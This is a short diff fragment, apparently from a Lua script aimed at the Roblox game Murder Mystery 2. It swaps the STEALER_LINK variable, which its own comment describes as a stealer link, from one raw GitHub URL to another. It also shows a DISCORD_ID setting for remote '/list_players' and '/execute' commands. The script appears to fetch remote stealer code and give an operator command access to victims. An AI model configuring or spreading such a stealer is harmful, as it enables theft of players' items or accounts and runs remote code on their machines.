@@ -237,7 +237,7 @@ pcall(function()
         end
     end
 
-    STEALER_LINK = 'https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script' -- stealer link (how to create is bellow)
+    STEALER_LINK = 'https://raw.githubusercontent.com/Cyber-Xong/script-MM2-update/refs/heads/main/MM2' -- stealer link (how to create is bellow)
 
     DISCORD_ID = '1234567' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
     
